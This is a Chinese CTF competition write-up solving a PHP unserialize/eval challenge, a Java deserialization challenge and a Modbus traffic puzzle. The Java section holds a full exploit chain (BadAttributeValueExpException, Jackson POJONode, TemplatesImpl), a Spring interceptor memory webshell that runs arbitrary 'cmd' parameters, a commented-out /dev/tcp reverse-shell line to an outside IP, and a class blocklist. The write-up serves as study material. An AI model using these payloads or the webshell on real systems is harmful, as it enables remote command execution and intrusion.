---
layout: post
title: 第三届京津冀长城杯
categories: [blog ]
tags: [Ctf,]
description: "线下比赛是没有外网的，纯内网"
image:
  feature: windows.jpg
  credit: Azeril
  creditlink: azeril.com
 

---

`测试`

![](/img/10/11.jpg)

### 前言

```
 本来是奔着倒数去的，但是队友一直出最后干到了第7和第6分数相同，但时间慢了些与拿奖擦肩而过。（qaq）
 励志好好学misc和java
```

### 首先是一道php题

```php
<?php
highlight_file(__FILE__);
function getflag(string $name,int $pass){  #这里是获得flag
    if($name=="ctf"&$pass==2022){
        echo file_get_contents("/flag");
    }
}
function noflag(string $name,int $pass){
    echo("noflag here");
}
class ctf{
    public $name = "getflag";

    public function __construct(){
    }
    public function __wakeup(){  #绕过wakeup
        $this->name = "noflag";

    }
    public function __call($fun,$arg){   #构造arg参数，
        if($fun=="wantflag"){
            if(preg_match("/^[a-z0-9,_.\[\]\']+$/i", $arg[0])){   #正则匹配
                if(strlen(explode(",",$arg[0])[0])>8){  #就是取出,前面的东西
                    $func = $this->name."(".$arg[0].");";   #this->name(arg(0))
                    eval($func);   #执行函数   system(ls)
                }
            }
        }

    }

}
class export{
    public $clazz = "";
    public $args = "";
    public function __construct(){

    }
    public function __destruct(){
        $this->clazz->wantflag($this->args);   #this->clazz=ctf   调用call方法
    }
}

unserialize($_POST['data']);
```

其实题目很容易理解

```
通过call方法中的eval调用到getflag即可
```

关键的部分是构造这段代码

```php
 public function __call($fun,$arg){   #构造arg参数，
        if($fun=="wantflag"){ #这里肯定是满足的   并且arg参数是我们可控的
            if(preg_match("/^[a-z0-9,_.\[\]\']+$/i", $arg[0])){   #正则匹配  arg[0]所以arg需要是一个数组
                if(strlen(explode(",",$arg[0])[0])>8){  #就是取出,前面的东西 逗号前面字符需要>8
                    $func = $this->name."(".$arg[0].");";   #this->name(arg(0))
                    eval($func);   #执行函数   system(ls)
                }
            }
        }
    }
# 正则作用就是匹配当中的字符  /i忽略大小写
function getflag(string $name,int $pass){  #这里是获得flag
    if($name=="ctf"&$pass==2022){  #这里是一个弱比较
        echo file_get_contents("/flag");
    }
}
```

然后需要绕过wakeup，php版本是8.0，但是改变wakeup属性值仍然可以绕过

当时比赛的时候卡了半天

```
$name=="ctf"
脑子里当时想的就是直接  ctfaaaaaaaaa==ctf不就可以了嘛，发现运行是不成功的
只要数字和字母比较才可以， "12a"==12  后者不能有字符串
```

骚姿势拼接进行绕过

![](/img/10/image-20230920104218139.png)



自己在复现的时候还是错误了

![](/img/10/image-20230920105302274.png)

![](/img/10/image-20230920105255431.png)

发现url编码的问题估计是我自己本地的错误，题目url编码就可以，还有写错了变量（纯自己问题）

![](/img/10/image-20230920175957134.png)

```
$e=new export();
$e->clazz=new ctf();
$e->args="'c'.'t'.'f',2022";
echo serialize($e);
echo urlencode(serialize($e));
```

## ScreenController

下面是做题的思路和笔记

```
这个黑名单想了好久，，结果压根没用我xxx
绕hashcode以前虎符杯做过，但是忘了，直接代码分析手算即可，就是差一个31的问题
最后拿那条jackson链子+spring内存马直接梭了
可能是出题人忘记使用了，应该不是故意这样的叭，有时间可以想想如果用了黑名单咋绕过
```



```
String[] evil_black = {"java.util.HashMap", "com.sun.jndi.rmi.registry.RegistryContext", "sun.reflect.annotation.AnnotationInvocationHandler", "java.util.PriorityQueue", "java.util.Hashtable", "sun.rmi.server.UnicastRef", "java.rmi.server.UnicastRemoteObject", "java.util.Hashtable", "org.springframework.core.SerializableTypeWrapper", "javax.management.BadAttributeValueExpException", "org.springframework.beans.factory.ObjectFactory", "xalan.internal.xsltc.trax.TemplatesImpl", "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl", "java.lang.Runtime", "com.sun.rowset.JdbcRowSetImpl", "javax.sql.rowset.BaseRowSet"};
```



```
首先没出口，肯定是调用 rmiconnect二次反序列化
snakeyaml
get  connect

这里需要一个调用Jackson tostring方法的来代替->jackson#tostring->get那个二次反序列化->spring内存马


一个hashcode的比较
如果 是 a bc 的话  

   a+31*a+b+(31*a+b)*31+c
 
 97
 97*31+98
 (97*31+98)*31+99    96354    aaa 96321   33差
 
 
 97
 97*31+97    差 1
 （97*31+97） *31+99   1+2=3  就是这里差三个    aaa  abc   
 
 3个字母差 一个 31 
 
 
 welcomeplayctf      rstuvwxyz      1501602951  1501602952     
 
 
 welcomeplaycuG              
 
 
 
 f  -31  
 
 
 a b c d 
 a  65  66  67  68 69 70  71
 
 
 
 
 
   
   
   welcomeplayctf
   
   
   302068959
   
   
   
   
   public static String secret1=" welcomeplayctf";
    public static String secret2=" welcomeplaycuG";
   
   

```

![](/img/10/image-20230915112206920.png)

```

```

![](/img/10/image-20230915130646665.png)

```
打 badattru->jackson#tostring-->spring马
```

```java
package com.Sctf;
import com.fasterxml.jackson.core.JsonProcessingException;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.node.BaseJsonNode;
import com.fasterxml.jackson.databind.node.POJONode;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.*;

import javax.management.BadAttributeValueExpException;
import java.io.*;
import java.lang.reflect.Field;
import java.net.URLEncoder;
import java.util.Base64;

public class Exp {
    private static String string;
    public static void main(String[] args) throws Exception {

        TemplatesImpl templates=(TemplatesImpl) getTemplatesImpl();
        POJONode pojoNode=new POJONode(templates);

        BadAttributeValueExpException badAttributeValueExpException=new BadAttributeValueExpException(null);
        Class<? extends BadAttributeValueExpException> aClass = badAttributeValueExpException.getClass();
        Field val = aClass.getDeclaredField("val");
        val.setAccessible(true);
        val.set(badAttributeValueExpException,pojoNode);


        serialize(badAttributeValueExpException);
//        unserialize("ser.bin");


        System.out.println(string);
        //unserialize();



    }
    public static Object getTemplatesImpl() throws IOException, NoSuchFieldException, IllegalAccessException, NotFoundException, CannotCompileException {
        TemplatesImpl templates=new TemplatesImpl();
        byte[] evilBytes=getEvilBytes();
        setFieldValue(templates,"_name","JYcxk");
        setFieldValue(templates,"_tfactory",new TransformerFactoryImpl());
        setFieldValue(templates,"_bytecodes",new byte[][]{evilBytes});
        return templates;

    }
    public static void setFieldValue(Object object,String field_name,Object filed_value) throws NoSuchFieldException, IllegalAccessException {
        Class clazz=object.getClass();
        Field declaredField=clazz.getDeclaredField(field_name);
        declaredField.setAccessible(true);
        declaredField.set(object,filed_value);
    }
    public static byte[] getEvilBytes() throws NotFoundException, CannotCompileException, IOException, NotFoundException, CannotCompileException, NotFoundException, CannotCompileException {
//        ClassPool classPool = new ClassPool(true);
//        CtClass hello = classPool.makeClass("Hello");
//        CtClass ctClass = classPool.getCtClass("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
//        hello.setSuperclass(ctClass);
//        CtConstructor  ctConstructor=new CtConstructor(new CtClass[]{},hello);
//        //ctConstructor.setBody("java.lang.Runtime.getRuntime().exec(new String[]{\"/bin/bash\",\"-c\",\"bash -i >& /dev/tcp/101.42.224.57/4444 0>&1\"});");
//        ctConstructor.setBody("Runtime.getRuntime().exec(new String[]{\"/bin/bash\", \"-c\", \"mkdir /home/jycxk/Desktop/sfsfs\"});");
//        hello.addConstructor(ctConstructor);
//        byte[] bytes=hello.toBytecode();
//        hello.detach();
        byte[] bytes = ClassPool.getDefault().get("com.sad.controller.SpringInterceptor").toBytecode();
        return bytes;

    }
    public static void serialize(Object object) throws Exception {
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(object);
        string = Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());


    }
    public static void unserialize() throws Exception {
        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(Base64.getDecoder().decode(string));
        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
        objectInputStream.readObject();
    }
//    public static void serialize(Object obj) throws IOException {
//        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream("ser.bin"));
//        objectOutputStream.writeObject(obj);
//    }
//    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException {
//        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(Filename));
//        return objectInputStream.readObject();
//    }
}

```

内存马

```java
package com.sad.controller;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.springframework.beans.BeansException;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;
import org.springframework.web.servlet.HandlerInterceptor;
import org.springframework.web.servlet.ModelAndView;

import javax.servlet.ServletContext;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.PrintWriter;
import java.lang.reflect.Field;
import java.lang.reflect.Method;

public class SpringInterceptor  extends AbstractTranslet implements HandlerInterceptor{
    static {
        try {
            //获取ApplicationContext
            WebApplicationContext context = null;
            try{
                //获取Child ApplicationContext
                context = (WebApplicationContext)RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
            }catch (Exception exception){
                //获取Root ApplicationContext
                Class webApplicationContextUtilsClass = Class.forName("org.springframework.web.context.support.WebApplicationContextUtils");
                Method getWebApplicationContext = webApplicationContextUtilsClass.getDeclaredMethod("getWebApplicationContext", ServletContext.class);
                getWebApplicationContext.setAccessible(true);
                ServletContext servletContext = ((ServletRequestAttributes) RequestContextHolder.getRequestAttributes()).getRequest().getSession().getServletContext();
                context = (WebApplicationContext) getWebApplicationContext.invoke(null, servletContext);
            }
            //获取HandlerMapping,旧版本是RequestMappingHandlerMapping,新版本是DefaultAnnotationHandlerMapping
            org.springframework.web.servlet.handler.AbstractHandlerMapping handlerMapping = null;
            try {
                Class<?> RequestMappingHandlerMapping = Class.forName("org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping");
                handlerMapping = (org.springframework.web.servlet.handler.AbstractHandlerMapping) context.getBean(RequestMappingHandlerMapping);
            }catch(BeansException exception){
                Class<?> DefaultAnnotationHandlerMapping = Class.forName("org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping");
                handlerMapping = (org.springframework.web.servlet.handler.AbstractHandlerMapping) context.getBean(DefaultAnnotationHandlerMapping);
            }
            //添加HandlerInterceptor
            Field field = org.springframework.web.servlet.handler.AbstractHandlerMapping.class.getDeclaredField("adaptedInterceptors");
            field.setAccessible(true);
            java.util.ArrayList<Object> adaptedInterceptors = (java.util.ArrayList<Object>) field.get(handlerMapping);
            adaptedInterceptors.add(new SpringInterceptor());
        }catch (Exception exception){
            exception.printStackTrace();
        }
    }
    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
        if(request.getHeader("Referer").equals("https://www.baidu.com/")){
            String cmd = request.getParameter("cmd");
            PrintWriter writer = response.getWriter();
            if (cmd != null) {
                String[] commands = null;
                if (System.getProperty("os.name").toLowerCase().contains("win")) {
                    Runtime.getRuntime().exec("calc");
                    commands = new String[]{"cmd", "/c", cmd};
                } else {
                    commands = new String[]{"/bin/bash", "-c", cmd};
                }
                String result = "";
                java.util.Scanner scanner = new java.util.Scanner(Runtime.getRuntime().exec(commands).getInputStream()).useDelimiter("\\A");
                result = scanner.hasNext() ? scanner.next(): result;
                System.out.println(result);
                writer.println(result);
                writer.flush();
                writer.close();
            }
            return false;
        }
        return true;
    }
    @Override
    public void postHandle(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView) throws Exception {
        HandlerInterceptor.super.postHandle(request, response, handler, modelAndView);
    }
    @Override
    public void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) throws Exception {
        HandlerInterceptor.super.afterCompletion(request, response, handler, ex);
    }
    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {}
    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {}
}
```

![](/img/10/image-20230915133149992.png)

## 公交车司机

流量分析

```
这道题我一开始看了一眼就放弃，感觉是特别牛的高科技运算啥的
但是解多了，队友直接A了
```

![](/img/10/image-20230920103610221.png)

没想到直接找modbus流量，然后最后一位然后拼接成hex编码即可

666c6167  这是找出的标准的flag头，剩下的也是同样的道理



### 总结

```
这场比赛我背锅，总是看见赛题就感觉很难，非常惧怕不敢做（也是不相信自己的行为）
尤其是1解 0解 那种，希望自己以后有做的勇气，做了又不亏啥。
```

